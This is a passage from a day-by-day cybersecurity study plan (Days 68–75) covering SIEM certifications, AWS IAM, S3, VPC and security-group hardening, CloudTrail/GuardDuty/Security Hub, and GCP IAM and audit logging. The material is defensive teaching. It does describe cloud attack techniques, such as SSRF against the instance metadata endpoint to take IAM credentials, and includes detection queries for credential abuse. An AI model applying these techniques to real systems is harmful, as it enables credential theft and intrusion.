Day 68: Elastic Security detection engine — 2,000+ pre-built rules, 5 rule types, custom threshold rule, EQL sequence detection, alert actions and routing.
Day 69: Full SOC investigation workflow — Timeline forensic workbench, 4-step analyst pivoting, Case management with disposition, written incident summary.
30 min · elastic.co/learn — complete free courses this week
red Elastic Certifications Career Credentials
Elastic Certifications: Validate Your Skills
Elastic Certified Analyst (ECA) — the most relevant certification for security analysts. Tests Kibana investigation, detection rule creation, alert triage, and incident investigation. Directly validates exactly the skills built this week.
Elastic Certified Engineer (ECE) — cluster management, pipeline engineering, performance tuning. More DevOps-oriented. For security engineers who deploy and maintain ELK infrastructure.
Both are proctored, practical exams — not multiple choice. You perform real tasks in a live Kibana environment. No memorisation tricks — actual operational skill is tested.

Strategy: Complete Elastic's free training at elastic.co/learn first — especially 'Getting Started with Elastic Stack' and 'Elastic Security Fundamentals'. Then practise in your home lab until ECA tasks feel effortless. The ECA exam directly mirrors what you built in Days 64–69.

20 min · elastic.co/learn — review certification requirements
dark Splunk — The Market Leader Next SIEM to Learn
Splunk: The Market Leader Worth Learning

Splunk is the most widely deployed enterprise SIEM globally. Average salary for Splunk-skilled SOC analysts: $90–110k. It is the single most mentioned SIEM in job postings — by a significant margin over ELK.

Splunk uses SPL (Search Processing Language) — conceptually similar to KQL but with different syntax. ELK knowledge transfers directly — the concepts of ingestion, parsing, searching, alerting, and dashboards are identical. The syntax is the main learning curve.

# KQL vs SPL comparison: # KQL (Kibana): event.outcome: failure AND source.ip: * # Splunk SPL equivalent: index=main event_outcome=failure | stats count by src_ip # Both achieve the same investigation — different syntax

Free training: trailhead.splunk.com — complete the 'Intro to Splunk' and 'Splunk Core User' paths. Both are free. The Splunk Core User certification validates foundational SPL skills.

Start Splunk free training at trailhead.splunk.com today
white Microsoft Sentinel Cloud SIEM
Microsoft Sentinel: Cloud-Native SIEM

Microsoft Sentinel is a cloud-native SIEM/SOAR platform built on Azure. It uses KQL (Kusto Query Language) — nearly identical to Kibana's KQL — making the transition straightforward after this week.

Job market reality: Azure + Sentinel skills command $95–125k in the current market. The SC-200 (Microsoft Security Operations Analyst) certification covers Sentinel deeply and is highly valued in enterprise environments that run Microsoft infrastructure.

The three SIEMs to know: ELK (built this week) + Splunk (learn next) + Sentinel (after Splunk). Together they cover 85%+ of enterprise SIEM deployments globally. Knowing all three places you in the top 5% of security operations candidates — a combination almost no entry-level candidate has.

Free sandbox: learn.microsoft.com provides free Sentinel lab environments. The SC-200 study guide includes hands-on labs at no cost.

Review SC-200 exam objectives at microsoft.com/learning
yellow What to Learn Today What to Learn
Day 70 Checklist
  • 1Complete Elastic's free 'Getting Started with Elastic Stack' course at elastic.co/learn — save completion
  • 2Sign up for Splunk free training at trailhead.splunk.com — complete 'Intro to Splunk' module
  • 3Write the resume bullet point: 'Built and operated a home SIEM using Elastic Stack — ingested Linux logs via Filebeat, created 10 custom KQL/EQL detection rules mapped to MITRE ATT&CK, and conducted complete incident investigations using Kibana Timeline and Case management'
  • 4Document your ELK home lab setup on GitHub — README with architecture diagram, components, and detection rules built
  • 5Research SC-200 and ECA certification requirements — plan which to pursue first
Total Day 70 Study Time: 120 – 150 minutes
resources_white Where to Learn Next Multi-SIEM Path
Your 3-SIEM Learning Path
🎓 ELK elastic.co/learn — Free Official Elastic Certifications Prep elastic.co/learn
🎓 Splunk trailhead.splunk.com — Free Splunk Core User Training trailhead.splunk.com
🎓 Sentinel learn.microsoft.com — Free SC-200 Sentinel Labs learn.microsoft.com/azure/sentinel
🧪 Path TryHackMe — SOC Level 1 Learning Path (all 3 SIEMs) tryhackme.com/path/outline/soclevel1
white Action Plan How to Complete
Your Final ELK Week Task
  • 1Complete Elastic free course at elastic.co/learn — 'Getting Started with Elastic Stack' (2–3 hours)
  • 2Start Splunk at trailhead.splunk.com — complete 'Intro to Splunk' (1 hour) — dual SIEM experience begins
  • 3Document your ELK home lab on GitHub — architecture, components, detection rules — link from LinkedIn
  • 4Write and save your ELK resume bullet point — 'Built and operated a home SIEM...' — ready to paste into applications
Hands-On Task: 120 – 150 minutes
stats Phase 7 Complete Progress Stats
Phase 7 Complete — Your Progress
70
Days of consistent learning — 78% of the journey done
1
Fully operational home SIEM built from scratch at zero cost
10+
Custom detection rules created and tested against simulated attacks
20
Days remaining — Cloud Security starts tomorrow
quote Pro Tip Pro Tip · Day 70
"Write this resume bullet now: 'Built and operated a home SIEM using Elastic Stack — ingested Linux authentication logs via Filebeat, created 10 custom KQL/EQL detection rules mapped to MITRE ATT&CK, and conducted complete incident investigations using Kibana Timeline and Case management.' That single bullet wins interviews."
ELK is not the only SIEM you will encounter. The concepts — ingest, parse, search, alert, investigate — transfer identically to Splunk, Sentinel, QRadar, and every other platform. The person who understands why each step exists will adapt to any new SIEM platform in days. The person who only memorised Kibana clicks will struggle every time the tool changes. Learn concepts deeply.
⚠ Common Mistake
Treating the three SIEM platforms as separate things to learn from scratch. ELK, Splunk, and Sentinel all do the same thing — collect logs, parse them, search them, alert on them, and help you investigate. The workflows are identical. The syntax differs. Master the workflow once on ELK, then the other two are just vocabulary lessons.
8
Phase 08
Cloud Security
Days 71–84 · 14 sessions
DAY 71
Cloud Security Fundamentals & Shared Responsibility
95% of cloud breaches are caused by the customer, not the provider. Know exactly where your responsibility starts.
#CloudSecurity#SharedResponsibility#Day71of90
dark The Shared Responsibility Model Foundation
Shared Responsibility: Your Line in the Sand
IaaSPaaSSaaS

The Shared Responsibility Model defines the exact boundary between what the cloud provider secures and what you secure. The provider owns physical infrastructure, hypervisor, and global network. You own everything on top — OS configurations, application code, data, IAM policies, network settings, and encryption choices.

The model shifts by service type: IaaS (EC2, GCE, Azure VM) gives you the most control and the most responsibility — you manage OS, runtime, app, and data. PaaS (App Engine, Elastic Beanstalk) hands the runtime and OS to the provider so you focus on app and data. SaaS (Gmail, Office 365) means the provider manages nearly everything — your job is user access and data governance only.

Why this matters for your career: Every cloud breach investigation starts with the same question — whose responsibility was the misconfigured setting? Analysts who can answer that immediately are far more valuable than those who have to look it up.

20 min · aws.amazon.com/compliance/shared-responsibility-model · cloud.google.com/architecture/framework/security
red Top Cloud Attack Vectors Threats
Cloud Attack Vectors: How Breaches Actually Happen
Misconfigured S3 buckets set to public read — the single most common cloud breach cause. Millions of records exposed from companies that clicked the wrong toggle.
Over-privileged IAM roles with wildcard permissions — granting `*` on everything when only `s3:GetObject` on one bucket was needed. The blast radius of a stolen credential becomes catastrophic.
SSRF exploiting the metadata endpoint at 169.254.169.254 — a vulnerable web app on EC2 can be tricked into returning the instance's IAM temporary credentials to an attacker.
API keys committed to GitHub — automated bots scan every public commit within seconds. Keys found this way are exploited within minutes of exposure.
Default credentials never changed after provisioning — databases, dashboards, and management panels spun up and forgotten with factory-default passwords.
20 min · Study each vector — you will see all five in cloud penetration tests
dark Cloud Security Posture Management CSPM
CSPM: Automated Audit of Your Cloud

Cloud Security Posture Management (CSPM) is continuous automated auditing of cloud configurations for misconfigurations and compliance violations. Instead of manual spot checks, CSPM tools run constantly and alert the moment a dangerous setting appears.

Three free open-source CSPM tools every security professional should know: Prowler (AWS-focused, github.com/prowler-cloud/prowler — over 300 checks aligned to CIS, PCI DSS, and GDPR) · Scout Suite (multi-cloud, github.com/nccgroup/ScoutSuite — generates an HTML report of every misconfiguration across AWS, Azure, and GCP) · CloudSploit (GitHub — lightweight and beginner-friendly).

The rule: run a CSPM tool against your own account on Day 1 of any cloud project before writing a single line of code. The findings on a brand new account are always surprising — and always educational.

20 min · github.com/prowler-cloud/prowler — install and run today
white Choose Your Cloud Platform Setup
Cloud Platform: Pick One and Go Deep
1AWS (Amazon Web Services): 32% global market share, most job postings, richest free security lab ecosystem (flaws.cloud, CloudGoat, cloud-specific CTFs). The safest career choice if you are deciding blind.
2GCP (Google Cloud Platform): Excellent free tier, genuinely the best free training via Cloud Skills Boost (monthly lab credits, no credit card needed), strong in data and ML environments.
3Azure (Microsoft): Dominant in enterprise environments. SC-200 is one of the most in-demand certifications right now. If your target employers run Microsoft infrastructure — and most large enterprises do — Azure is the choice.
15 min · Create a free account on your chosen platform today
yellow What to Learn Today What to Learn
Day 71 Checklist
  • 1Create a free account on your chosen cloud platform — AWS free tier / GCP free tier / Azure $200 credit
  • 2Enable MFA on the root/owner account immediately — before anything else
  • 3Install the CLI — aws-cli, gcloud, or az — and authenticate successfully from your terminal
  • 4Run Scout Suite or Prowler against your fresh account — document every finding
  • 5Read the Shared Responsibility Model page for your chosen provider — note exactly what YOU are responsible for
Total Day 71 Study Time: 120 – 150 minutes (account setup day)
resources_white Where to Learn Free Resources
Free Resources for Today
📖 AWS AWS Shared Responsibility Model — Official Explanation aws.amazon.com/compliance/shared-responsibility-model
📖 GCP Google Cloud Architecture Framework — Security Section cloud.google.com/architecture/framework/security
🔧 Tool Prowler — Free Multi-Cloud Security Auditing Tool github.com/prowler-cloud/prowler
🔧 Tool Scout Suite — Free Multi-Cloud Security Auditor github.com/nccgroup/ScoutSuite
white Action Plan How to Learn
Your Hands-On Task for Day 71
  • 1Create your cloud account and immediately enable MFA on the root account — do not skip this
  • 2Install the CLI tool for your platform — authenticate with `aws configure` / `gcloud init` / `az login`
  • 3Run Scout Suite or Prowler — `pip install scoutsuite && scout aws` — save the HTML report
  • 4Document every finding — even on a fresh account — and note what misconfiguration each finding represents
Hands-On Task: 90 – 120 minutes (includes account and CLI setup)
quote Pro Tip Pro Tip · Day 71
"Cloud security is the single fastest-growing and highest-paying security specialization. Average cloud security engineer salary in the US: $130–160k. Every skill built in the past 70 days — Linux, Python, networking, SIEM — applies directly in cloud environments. You are not starting over. You are adding a critical layer on top of everything you already know."
The three attack vectors worth memorising cold before any cloud interview: misconfigured public S3 buckets, over-privileged IAM roles, and SSRF against the instance metadata service. These three alone account for the majority of real-world cloud breaches documented in public breach disclosures over the past five years. Know each one, know the attacker's exact technique, and know the one configuration change that prevents it.
⚠ Common Mistake
Starting cloud labs without enabling billing alerts. Accidental charges from forgotten resources are extremely common — a NAT Gateway left running overnight, an EC2 instance left on for a week, a forgotten Elasticsearch cluster. Enable a billing alert at $5 on AWS and Azure BEFORE running any lab. This is the first thing, not an afterthought.
DAY 72
AWS IAM: Users, Roles, Policies & Least Privilege
AWS IAM is where 90% of cloud breaches begin. Master it and you prevent most attacks before they start.
#AWSIAM#LeastPrivilege#Day72of90
dark IAM Core Components Foundation
IAM: The Four Components You Must Know
UsersRolesPolicies

AWS Identity and Access Management (IAM) controls who can do what to which AWS resource. Four core components build the entire system: Users (long-term credentials for humans) · Groups (collections of users sharing a policy) · Roles (temporary credentials for services, applications, and cross-account access) · Policies (JSON documents defining Allow or Deny for specific actions on specific resources).

The golden rule of AWS IAM: never use the root account after initial setup. The root account has unrestricted access to everything in the account and cannot be limited by any policy. Create an admin IAM user immediately after account creation and lock root credentials away permanently. Any SOC analyst who sees root account activity in CloudTrail logs treats it as a critical alert.

Explicit Deny always beats Allow — regardless of what other policies say. If a Deny exists anywhere in the policy evaluation chain, the action is blocked. Understanding this evaluation order is the key to debugging unexpected IAM permission errors without guessing.

20 min · docs.aws.amazon.com/IAM/latest/UserGuide
red IAM Policy Structure Policy Anatomy
Policy Structure: Read Any AWS Policy
# Every IAM policy is JSON with four key fields: { "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", # Allow or Deny "Action": "s3:GetObject", # Which API call (avoid * always) "Resource": "arn:aws:s3:::my-bucket/*", # Which resource "Condition": { # Optional restrictions "IpAddress": { "aws:SourceIp": "203.0.113.0/24" } } } ] }

Condition blocks are the most underused IAM feature. You can restrict actions to specific IP ranges, require MFA, limit to specific time windows, or enforce encryption headers on S3 uploads — all without changing the core Allow. Policies without Conditions are almost always broader than they need to be.

Resource ARN specificity matters: `arn:aws:s3:::*` grants access to every bucket in your account. `arn:aws:s3:::my-bucket/*` grants access to only one bucket. The difference between these two is the difference between a contained breach and a total data loss.

25 min · Use IAM Policy Simulator at console.aws.amazon.com/policysim
dark IAM Roles for EC2 Critical Practice
IAM Roles: Never Store Keys on EC2

The single most important IAM security practice: never store AWS access keys on an EC2 instance as environment variables, config files, or in application code. Assign an IAM Role to the instance instead. The application retrieves temporary, automatically-rotating credentials via the metadata service at runtime — no long-lived secret exists to steal, rotate, or accidentally expose.

# WRONG — hardcoded keys on EC2: export AWS_ACCESS_KEY_ID=AKIA... export AWS_SECRET_ACCESS_KEY=abc123... # RIGHT — IAM Role attached to EC2 instance: # Assign the role at launch, then in your application: import boto3 # Credentials are retrieved automatically from the role s3 = boto3.client('s3') # No keys needed anywhere

IAM Access Analyzer is a free AWS service that identifies roles, S3 buckets, KMS keys, and Lambda functions shared with external accounts or the internet. Run `aws accessanalyzer list-findings` monthly. Enable it in every region simultaneously — external access findings routinely appear in regions that are assumed to be unused.

20 min · Enable IAM Access Analyzer in your account now
white Auditing IAM with CLI Security Audit
IAM Audit: Find Problems Before Attackers Do
# Generate and retrieve the full IAM credential report: aws iam generate-credential-report aws iam get-credential-report --query 'Content' \ --output text | base64 -d > iam_report.csv # The CSV contains every IAM user with: # - Last access dates for console and API # - MFA enabled status # - Access key ages and last used dates # - Password last changed date # Red flags to immediately investigate: # Any user: mfa_active = false # Any access_key: last_used_date > 90 days ago # Root account: access_key_1_active = true # Root account: mfa_active = false

Run this audit monthly at minimum. Any IAM user with console access and no MFA is a critical finding — the equivalent of leaving an admin account with no password on the public internet. Any access key unused for 90+ days should be deactivated immediately — dormant credentials are prime targets for credential-stuffing attacks.

20 min · Run the credential report against your account right now
yellow What to Learn Today What to Learn
Day 72 Checklist
  • 1Complete flaws.cloud Levels 1–4 — each level teaches one real S3 or IAM misconfiguration by letting you exploit it safely
  • 2Run `aws iam generate-credential-report` — review the output for MFA gaps and stale access keys
  • 3Create an IAM user with least-privilege policy — only the permissions needed for one specific task
  • 4Enable IAM Access Analyzer — run `aws accessanalyzer list-findings` and review every result
  • 5Understand the Explicit Deny evaluation rule — test it with the IAM Policy Simulator
Total Day 72 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
🧪 Lab flaws.cloud — Free AWS Security Challenges (Real Pentest Findings) flaws.cloud
📖 Docs AWS IAM Official User Guide docs.aws.amazon.com/IAM/latest/UserGuide
🔧 Tool IAM Policy Simulator — Test Policies Before Deploying console.aws.amazon.com/policysim
🔧 Tool cloudsplaining — IAM Policy Risk Analyzer (Salesforce) github.com/salesforce/cloudsplaining
white Action Plan How to Learn
Your Hands-On Task for Day 72
  • 1Complete flaws.cloud Levels 1–4 — for each level: write the misconfiguration, the CLI command that revealed it, the one-line fix
  • 2Run the IAM credential report — flag every user without MFA and every key unused for 90+ days
  • 3Create a restrictive IAM policy for S3 read-only on one bucket — test it with the Policy Simulator
  • 4Enable IAM Access Analyzer — document every external access finding in your account
Hands-On Task: 90 – 120 minutes (flaws.cloud is the main lab today)
quote Pro Tip Pro Tip · Day 72
"flaws.cloud was built by Scott Piper, a former Netflix cloud security engineer. Every level represents a misconfiguration found on real client engagements. Completing all six levels and explaining each finding and fix is a genuine interview differentiator — it shows practical hands-on knowledge rather than just certification studying."
The IAM Roles vs Access Keys distinction is the most important security architecture decision in AWS. Long-lived access keys are static credentials — they do not expire, they can be stolen silently, and they appear in breach after breach. IAM Roles issue temporary credentials with automatic rotation via STS. There is almost never a legitimate reason to use access keys on an EC2 instance. In any cloud architecture review, access keys stored on instances are an immediate critical finding.
⚠ Common Mistake
Enabling billing alerts after starting labs instead of before. Cloud bills from forgotten resources accumulate silently. A single NAT Gateway left running generates $30–40/month in AWS with zero usage. Set a billing alarm at $1 in CloudWatch before running any lab session. Check the billing console at the end of every session. This discipline saves real money and teaches cost awareness — a skill cloud security engineers are expected to have.
DAY 73
AWS S3 Security, VPC & Security Groups
Misconfigured S3 buckets and open security groups have leaked billions of records. Here's how to get both right permanently.
#AWSS3#VPCSecurity#Day73of90
dark S3 Bucket Security Essentials Foundation
S3 Security: Four Settings That Prevent Breaches
Block Public AccessVersioningEncryption

S3 buckets are private by default. Public access is a setting you must explicitly enable — and almost never should. The 'Block Public Access' setting has four independent toggles that must ALL be switched on for complete protection. A single unchecked toggle is the misconfiguration responsible for multiple billion-record data breaches in the past five years.

# Check a bucket's public access block settings via CLI: aws s3api get-public-access-block --bucket BUCKETNAME # Expected output (all must be true): # BlockPublicAcls: true # IgnorePublicAcls: true # BlockPublicPolicy: true # RestrictPublicBuckets: true # Audit bucket ACL permissions: aws s3api get-bucket-acl --bucket BUCKETNAME # Enable block public access if not set: aws s3api put-public-access-block \ --bucket BUCKETNAME \ --public-access-block-configuration \ BlockPublicAcls=true,IgnorePublicAcls=true,\ BlockPublicPolicy=true,RestrictPublicBuckets=true

Enable versioning and MFA Delete on critical buckets. Versioning keeps copies of every object version. MFA Delete requires a physical MFA token to permanently delete any version — this single control prevents ransomware from destroying your S3 data even if full AWS credentials are compromised.

20 min · docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html
red VPC Architecture Best Practice Network Architecture
VPC Architecture: Keep Your Workloads Off the Internet
Public subnets for load balancers only — the only tier that ever needs a public IP. No application server, database, or internal service should ever be here directly.
Private subnets for EC2, RDS, Lambda — all compute and data resources live here with no direct internet route. The only path in is through the load balancer.
NAT Gateway for outbound-only internet — private subnet resources can initiate outbound connections (for software updates, API calls) but inbound connections from the internet are impossible.
No Internet Gateway attached to private subnet route tables — the most common VPC misconfiguration. A single accidental route entry makes a 'private' subnet fully public.

This architecture pattern alone prevents the majority of direct attacks against application and database tiers. A misconfigured EC2 database with a public IP in a public subnet is a direct attack surface — this pattern makes that impossible by design.

20 min · Draw this architecture on paper before building it in AWS
dark Security Groups Virtual Firewall
Security Groups: Your Last Line of Host Defence

Security groups are stateful virtual firewalls attached to EC2 instances and other AWS resources. Rules define allowed traffic by protocol, port range, and source or destination. Stateful means return traffic is automatically allowed — you only define inbound rules for accepted connections.

# Audit every security group open to the internet: aws ec2 describe-security-groups \ --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" \ --query 'SecurityGroups[*].{ID:GroupId,Name:GroupName,\ Rules:IpPermissions}' # Critical rules — NEVER allow from 0.0.0.0/0: # Port 22 (SSH) # Port 3389 (RDP) # Port 3306 (MySQL) # Port 5432 (PostgreSQL) # Correct approach — restrict SSH to your IP only: # Source: 203.0.113.45/32 (your static IP) # Or: reference another security group ID instead of CIDR # Security group references auto-update when instances change

Use security group references instead of CIDR ranges wherever possible. Referencing another security group ID means the rule automatically applies to all instances in that group — regardless of their IP addresses. This scales perfectly and never requires manual updates when instances are replaced.

25 min · Run the CLI audit and fix every 0.0.0.0/0 finding
white S3 Encryption Standards Data Protection
S3 Encryption: AES-256 is the Floor, Not the Ceiling

Server-side encryption is now the default on all new S3 buckets — SSE-S3 with AES-256 is applied automatically. This is the minimum acceptable baseline for all data. For regulated data (healthcare, financial, government), the requirements go further.

SSE-KMS uses your own KMS Customer Managed Key and logs every single decryption event via CloudTrail. This creates a complete audit trail of every access to sensitive data — required for HIPAA, PCI DSS, and SOC 2 compliance. You can revoke the key and immediately make encrypted data unreadable, even to AWS itself.

SSE-C lets you supply your own encryption keys entirely. AWS never stores your key — you must send it with every request. Maximum control, maximum operational burden. Used only when regulatory requirements specifically demand customer-controlled keys with zero cloud provider access.

15 min · Verify encryption is enabled on every bucket in your account
yellow What to Learn Today What to Learn
Day 73 Checklist
  • 1Create an S3 bucket — upload a test file — verify it is NOT publicly accessible via browser URL
  • 2Create a VPC with one public subnet and one private subnet — draw the diagram before building
  • 3Launch an EC2 t2.micro in the private subnet — confirm it has no public IP
  • 4Create a security group allowing SSH only from your specific IP address — not 0.0.0.0/0
  • 5Run the CLI command to audit all security groups for open 0.0.0.0/0 rules — document every finding
Total Day 73 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
📖 Docs AWS S3 Security Best Practices — Official Guide docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html
🧪 Lab flaws.cloud Level 2 — S3 Bucket Misconfiguration flaws.cloud
🔧 Tool CloudMapper — Free VPC Attack Path Visualisation github.com/duo-labs/cloudmapper
📖 Docs AWS VPC Documentation — Official Reference aws.amazon.com/vpc
white Action Plan How to Learn
Your Hands-On Task for Day 73
  • 1Build the VPC: create public subnet + private subnet + Internet Gateway + NAT Gateway + separate route tables for each
  • 2Create an S3 bucket with all 4 Block Public Access toggles enabled — attempt browser access and confirm 403
  • 3Create a security group: SSH allowed ONLY from your IP (x.x.x.x/32) — run the CLI audit and confirm no 0.0.0.0/0 appears
  • 4Screenshot each step — document the exact misconfiguration each setting prevents
Hands-On Task: 75 – 90 minutes
quote Pro Tip Pro Tip · Day 73
"When designing a VPC, draw the architecture on paper first — public subnets, private subnets, NAT Gateways, route tables, Internet Gateway, and security group boundaries. Engineers who can draw their cloud infrastructure from memory in interviews consistently outperform those who only know the console clicks. Architecture fluency is a seniority signal."
The security group audit command — `aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values=0.0.0.0/0` — is one of the first commands cloud security engineers run on a new engagement. Wide-open security groups are the second most common finding in AWS penetration tests after IAM over-privilege. Running this in your own account and fixing every result is the exact work a cloud security engineer does on Day 1 of any assessment.
⚠ Common Mistake
Leaving NAT Gateways running after finishing a lab. NAT Gateways cost approximately $0.045 per hour even when completely idle with zero traffic passing through them. That is $32/month for a gateway doing nothing. Always delete NAT Gateways at the end of every lab session. They are the single most common source of unexpected AWS bills among security learners.
DAY 74
AWS CloudTrail, GuardDuty & Security Hub
AWS gives you powerful native threat detection tools. Most people never turn them on. Today you do.
#CloudTrail#GuardDuty#Day74of90
dark AWS CloudTrail Foundation
CloudTrail: Every AWS Action, Recorded Forever
CloudTrailGuardDutySecurity Hub

AWS CloudTrail records every single AWS API call made in your account — who called it, from which IP address, at what time, with what parameters, and whether it succeeded or failed. It is the forensic audit trail for every action taken in your cloud environment. In any AWS breach investigation, CloudTrail is always the first data source every analyst examines.

Configuration that matters: enable CloudTrail in all regions simultaneously — not just your primary region. Attacks frequently originate from regions that appear unused. Store logs in an S3 bucket with log file integrity validation turned on — this detects any tampering with audit logs before the evidence reaches investigators.

# Essential CloudTrail queries via CloudWatch Logs Insights: # Who deleted a security group: filter EventName = 'DeleteSecurityGroup' # All IAM changes (critical — any IAM modification is suspicious): filter EventSource = 'iam.amazonaws.com' # Root account usage (should always be zero): filter userIdentity.type = 'Root' # Failed console logins — brute force detection: filter EventName = 'ConsoleLogin' AND errorMessage = 'Failed authentication'
20 min · docs.aws.amazon.com/awscloudtrail/latest/userguide
red AWS GuardDuty ML-Based Threat Detection
GuardDuty: ML Threat Detection Running 24/7
What it analyses automatically: CloudTrail management events, VPC Flow Logs, and DNS query logs — no agent installation, no configuration required, no log shipping setup.
Cryptocurrency mining detection — identifies EC2 instances communicating with known mining pools. Often the first sign of a compromised instance being monetised.
Credential exfiltration — detects API calls from known malicious IP addresses, TOR exit nodes, and impossible-travel scenarios (login from Pakistan and Singapore within 30 minutes).
C2 communication — detects outbound connections to known command-and-control infrastructure from your instances.
Anomalous API call patterns — machine learning baseline of normal API usage detects sudden spikes or unusual API calls from compromised credentials.

Free 30-day trial. Approximately $4/month after for small accounts. Enable it — it catches entire categories of attacks that signature-based tools miss entirely. Never running GuardDuty is the cloud equivalent of running a server with no IDS.

20 min · aws.amazon.com/guardduty — enable the free trial right now
dark AWS Security Hub Central Aggregator
Security Hub: One Score for Your Entire Posture

AWS Security Hub is the central aggregator for findings from GuardDuty, Inspector, Macie, IAM Access Analyzer, and third-party integrations. Instead of checking six separate dashboards, Security Hub pulls everything into a single view with a unified security score from 0 to 100%.

CIS AWS Foundations Benchmark checks run automatically inside Security Hub — over 170 automated compliance controls evaluating your account configuration continuously. Each failed check includes a specific severity rating, affected resource, and AWS-authored remediation guidance. The score on a fresh account is almost never above 50%.

MITRE ATT&CK mapping is built into GuardDuty findings — every detected threat is tagged with the relevant ATT&CK technique. This is the same framework you studied in the detection engineering phase, now applied directly to cloud attack patterns. The concepts transfer exactly.

20 min · aws.amazon.com/security-hub — enable alongside GuardDuty
white The Minimum Viable AWS Security Stack Security Baseline
AWS Security Trio: Blind Without All Three

CloudTrail + GuardDuty + Security Hub is the minimum viable AWS security monitoring stack. Any AWS environment running without all three is flying completely blind — no audit trail, no threat detection, no compliance visibility.

The interview answer to 'how would you set up security monitoring in a new AWS account?' starts here. Enable CloudTrail in all regions with S3 storage and integrity validation. Enable GuardDuty with the free trial and all optional data sources. Enable Security Hub with CIS Benchmark checks. This trio takes under 20 minutes to configure and covers the entire basic detection stack.

CloudTrail data events — S3 object-level logging that records every GetObject and PutObject — are not included in the default trail. They cost extra and generate enormous volumes on busy accounts. Enable them only for your highest-value buckets, not all buckets globally, to prevent surprise billing spikes.

25 min · Enable all three in your AWS account before moving on
yellow What to Learn Today What to Learn
Day 74 Checklist
  • 1Enable CloudTrail in all regions — log to S3 with integrity validation turned on
  • 2Enable GuardDuty free trial — explore the finding categories in the console
  • 3Enable Security Hub with CIS Benchmark checks — note your initial security score
  • 4Query CloudTrail for your own recent API calls — find your console logins and S3 actions
  • 5Document every Security Hub FAILED check and the specific remediation action for each
Total Day 74 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
📖 Docs AWS CloudTrail Official Documentation docs.aws.amazon.com/awscloudtrail/latest/userguide
📖 Docs AWS GuardDuty — Enable Free 30-Day Trial aws.amazon.com/guardduty
📖 Docs AWS Security Hub — CIS Benchmark Checks aws.amazon.com/security-hub
🧪 Lab TryHackMe — AWS Security Rooms (free) tryhackme.com
white Action Plan How to Learn
Your Hands-On Task for Day 74
  • 1Enable CloudTrail: all regions, log to a dedicated S3 bucket, enable log file integrity validation
  • 2Enable GuardDuty: free trial, note which data sources it analyses automatically
  • 3Enable Security Hub: CIS AWS Foundations Benchmark + AWS Foundational Security Best Practices
  • 4Wait 15 minutes, then open CloudTrail and find your own console logins — document the exact event fields you see
Hands-On Task: 60 – 75 minutes
quote Pro Tip Pro Tip · Day 74
"CloudTrail + GuardDuty + Security Hub is the minimum viable AWS security monitoring stack. Any AWS environment without all three is flying completely blind. Memorise this trio — 'how would you set up security monitoring in a new AWS account?' is one of the most common cloud security interview questions, and this is the correct first answer."
GuardDuty finding severity levels map directly to response priority: HIGH (7.0–8.9) requires immediate investigation — escalate immediately. MEDIUM (4.0–6.9) requires investigation within 24 hours. LOW (1.0–3.9) can be reviewed weekly. Understanding this triage framework and being able to articulate it in an interview demonstrates genuine operational thinking rather than tool knowledge alone.
⚠ Common Mistake
Enabling CloudTrail data events for all S3 buckets globally. S3 data events log every GetObject call — in a busy account with thousands of objects being accessed daily, this generates millions of log entries per day. The cost scales with volume and can generate $50–200/month on active accounts. Enable data events selectively on your highest-value buckets only: the ones containing PII, credentials, or business-critical data.
DAY 75
GCP Security: IAM, Cloud Logging & Security Command Center
Google Cloud powers YouTube, Gmail, and thousands of enterprise workloads. Here's the complete GCP security model.
#GCPSecurity#CloudIAM#Day75of90
dark GCP IAM Fundamentals Foundation
GCP IAM: Hierarchy Makes It Powerful and Dangerous
PrincipalsRolesService Accounts

GCP IAM binds three things together: a Principal (who) + a Role (what permissions) + a Resource (which GCP resource the role applies to). Three role types: Basic (Owner/Editor/Viewer — overly broad, avoid in production), Predefined (service-specific, hundreds available), and Custom (you define exactly which permissions are included).

The critical difference from AWS: GCP IAM is hierarchical. Policies applied at the Organisation level inherit down through every Folder, then every Project, then every Resource. A single misconfigured org-level binding grants access across every project in the entire organisation — potentially thousands of resources from one mistake.

Service Accounts are the GCP equivalent of AWS IAM Roles for workloads. Create one dedicated service account per application with only the permissions it needs. Avoid service account JSON key files — they are long-lived credentials that routinely get committed to source control. Use Workload Identity Federation for keyless authentication from outside GCP.

20 min · cloud.google.com/iam/docs
red Cloud Logging & Audit Logs Forensic Visibility
Cloud Logging: Your GCP Forensic Starting Point
# Admin Activity logs are always on and always free: # Records all admin API calls, IAM changes, config modifications # Find all recent IAM policy changes: gcloud logging read \ 'protoPayload.methodName="SetIamPolicy"' \ --limit=20 # Find all service account key creations (critical alert): gcloud logging read \ 'protoPayload.methodName="google.iam.admin.v1.\ CreateServiceAccountKey"' --limit=10 # Find all resource deletions in last hour: gcloud logging read \ 'protoPayload.methodName:"delete" \ timestamp>"2026-04-23T00:00:00Z"' --limit=20

Data Access logs must be enabled manually — they are not on by default. Enable them for Cloud Storage, BigQuery, and any service holding sensitive data. These record every read and write to your data. Without them enabled, an attacker can exfiltrate your entire Cloud Storage bucket and leave no forensic trace.

20 min · Enable Data Access logs for your critical GCP services
dark Security Command Center GCP CSPM
Security Command Center: Free CSPM Built into GCP

Security Command Center (SCC) is GCP's native CSPM and threat detection platform. The Standard tier is completely free and available to every GCP project. No installation, no agent, no configuration — enable it and findings appear immediately.

What SCC Standard detects out of the box: publicly accessible Cloud Storage buckets · overly permissive firewall rules allowing all ingress · over-privileged service accounts with Editor or Owner roles · cryptomining VM activity via anomalous CPU usage patterns · anomalous API call volumes from service accounts.

GCP Firewall Rules operate at the VPC network level — unlike AWS security groups which attach to individual instances. Best practice: create an explicit deny-all-ingress default rule for every network, then add specific allow rules using network tags. Target-tag-based rules apply to logical groups of instances automatically and scale without manual updates.

20 min · Enable Security Command Center Standard in your GCP project
white GCP IAM Recommender Automated Least Privilege
IAM Recommender: ML Does the Cleanup Work

GCP's IAM Recommender uses machine learning to analyse actual permission usage over 90 days and automatically recommend removing permissions that were never used. In production environments, following Recommender's suggestions typically reduces the blast radius of a compromised account by 60–80%.

How to access it: GCP Console → IAM & Admin → Recommendations. Every overly-broad binding gets a specific recommendation: 'Replace role roles/editor on project X with roles/storage.objectViewer on bucket Y — this binding has 847 permissions but only 2 were used in the past 90 days.'

